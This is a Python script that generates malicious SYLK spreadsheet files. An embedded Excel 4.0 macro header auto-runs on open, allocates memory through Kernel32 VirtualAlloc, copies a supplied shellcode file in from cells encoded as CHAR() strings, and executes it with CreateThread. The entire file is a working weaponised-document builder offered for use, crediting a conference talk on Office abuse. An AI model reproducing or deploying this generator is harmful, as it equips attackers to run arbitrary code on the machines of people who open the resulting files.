#!/usr/bin/python
import sys

# Some of this code is bastardised from code by @StanHacked
# For a breakdown of this technique I recommend watching
# http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen

def bytes2int(str):
	return int(str.encode('hex'), 16)

SHELLCODE_HEADER = """ID;P
O;E
NN;NAuto_open;ER1C1;KSpreadsheet;F
C;X1;Y1;K0;ER1C2()
C;X1;Y2;K0;ECALL("Kernel32","VirtualAlloc","JJJJJ",0,1000000,4096,64)
C;X1;Y3;K0;ESELECT(R1C2:R1000:C2,R1C2)
C;X1;Y4;K0;ESET.VALUE(R1C3, 0)
C;X1;Y5;K0;EWHILE(LEN(ACTIVE.CELL())>0)
C;X1;Y6;K0;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
C;X1;Y7;K0;ESET.VALUE(R1C3, R1C3 + 1)
C;X1;Y8;K0;ESELECT(, "R[1]C")
C;X1;Y9;K0;ENEXT()
C;X1;Y10;K0;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
C;X1;Y11;K0;EHALT()
"""

def generate_slk(shellcode_path):
	return build_shellcode_slk(shellcode_path)

def build_shellcode_slk(shellcode_path):
	#print("[*] Building shellcode exec SLK")

	slk_output = SHELLCODE_HEADER
	with open(shellcode_path, "rb") as f:
	    byte = f.read(1)
	    i = 0
	    cell=0
	    while byte != "":
		if i == 0:
			cell=cell+1
			slk_output+=("C;X2;Y%s;K0;E" % (str(cell)))
		else:
			slk_output+=("&")
		slk_output+=("CHAR(" + str(bytes2int(byte)) + ")")
	        byte = f.read(1)
		i+=1
		if i == 20:
			slk_output+=("\n")
			i = 0
	cell=cell+1
	slk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
	return slk_output